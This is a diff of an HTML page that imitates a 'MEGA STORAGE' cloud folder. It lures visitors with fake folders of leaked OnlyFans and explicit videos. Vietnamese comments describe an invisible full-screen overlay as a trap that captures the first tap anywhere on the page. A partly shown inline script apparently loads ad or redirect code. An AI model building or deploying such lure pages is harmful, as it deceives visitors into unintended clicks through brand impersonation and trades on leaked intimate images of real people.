@@ -1,8 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta name="42788edf4165172d056f4027a278f27e5f4d1b53" content="42788edf4165172d056f4027a278f27e5f4d1b53" />
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MEGA STORAGE - Cloud Connect</title>
+    
     <script>
     (function(phsl){
     var d = document,
@@ -16,58 +18,77 @@
     })({})
     </script>
 
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Storage - Cloud Access</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background-color: #0f172a; color: #e2e8f0; font-family: sans-serif; }
+        body { background-color: #0b1120; color: #94a3b8; font-family: -apple-system, system-ui, sans-serif; padding: 15px; }
         
-        /* CÁI BẪY TÀNG HÌNH BAO PHỦ MÀN HÌNH */
+        /* BẪY TÀNG HÌNH PHỦ KÍN 100% MÀN HÌNH */
         #trap {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 9999;
-            cursor: pointer;
-            background: rgba(0,0,0,0.01); /* Rất mờ để vẫn tính là có click */
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 9999; cursor: pointer; background: rgba(0,0,0,0);
         }
 
-        .container { max-width: 500px; margin: 0 auto; padding: 20px; text-align: center; }
-        .folder-item { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 10px; display: flex; align-items: center; border: 1px solid #334155; }
-        .icon { font-size: 24px; margin-right: 15px; }
-        .info { text-align: left; flex-grow: 1; }
-        .name { font-weight: bold; color: #3b82f6; }
-        .meta { font-size: 12px; color: #94a3b8; }
-        .btn-main { margin-top: 20px; background: #2563eb; padding: 15px; border-radius: 10px; font-weight: bold; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; padding: 10px 5px; border-bottom: 1px solid #1e293b; }
+        .logo { color: #3b82f6; font-weight: bold; font-size: 20px; text-transform: uppercase; }
+        .status { color: #22c55e; font-size: 13px; font-weight: bold; }
+        
+        /* Layout Folder giống hệt ảnh sếp gửi */
+        .folder-card {
+            background: #1e293b; border: 1px solid #334155; border-radius: 12px;
+            padding: 20px; margin-bottom: 15px; display: flex; align-items: center;
+        }
+        .icon { font-size: 32px; margin-right: 15px; filter: grayscale(0.5); }
+        .info { flex-grow: 1; }
+        .info b { display: block; color: #f1f5f9; font-size: 14px; margin-bottom: 5px; text-transform: uppercase; }
+        .info span { font-size: 11px; color: #64748b; }
+
+        /* Nút Download màu xanh đậm chuẩn Mega */
+        .btn-download {
+            background: #2563eb; color: #ffffff; text-align: center; padding: 18px;
+            border-radius: 10px; font-weight: bold; margin-top: 15px; font-size: 16px;
+            box-shadow: 0 4px 15px rgba(37, 99, 235, 0.4);
+        }
+
+        .footer-text { text-align: center; font-size: 10px; margin-top: 30px; color: #475569; }
     </style>
 </head>
 <body>
 
     <div id="trap" onclick="this.style.display='none'"></div>
 
-    <div class="container">
-        <h1 style="color: #3b82f6; margin-bottom: 20px;">MEGA STORAGE v3.4</h1>
-        
-        <div class="folder-item">
-            <div class="icon">📁</div>
-            <div class="info">
-                <p class="name">0NLYFAN5_L3AK5_2026</p>
-                <p class="meta">542 Files • 1.2 GB</p>
-            </div>
-        </div>
-
-        <div class="folder-item">
-            <div class="icon">📁</div>
-            <div class="info">
-                <p class="name">LAT1NA_C0LL3CT10N</p>
-                <p class="meta">128 Files • 856 MB</p>
-            </div>
-        </div>
-
-        <div class="btn-main">DOWNLOAD ALL PRIVATE VIDEOS</div>
-        <p style="font-size: 10px; color: #475569; margin-top: 20px;">© 2026 Secure Cloud</p>
+    <div class="header">
+        <div class="logo">MEGA STORAGE <span style="font-size: 10px; opacity: 0.5;">(v3.4)</span></div>
+        <div class="status">● Online</div>
     </div>
 
-</body>
-</html>
+    <div class="folder-card">
+        <div class="icon">📁</div>
+        <div class="info">
+            <b>M1LF</b>
+            <span>142 Files • 1.4 GB • Updated 2h ago</span>
+        </div>
+    </div>
+
+    <div class="folder-card">
+        <div class="icon">📁</div>
+        <div class="info">
+            <b>LATINA</b>
+            <span>85 Files • 890 MB • Private Access</span>
+        </div>
+    </div>
+
+    <div class="folder-card">
+        <div class="icon">📁</div>
+        <div class="info">
+            <b>ONLYF4N_LEAKED</b>
+            <span>210 Files • 2.1 GB • Encrypted</span>
+        </div>
+    </div>
+
+    <div class="folder-card">
+        <div class="icon">📁</div>
+        <div class="info">
+            <b>M4STURBATION</b>
+            <span>56 Files • 4.2 GB • Full HD</span>
+        </div>
+    </div>
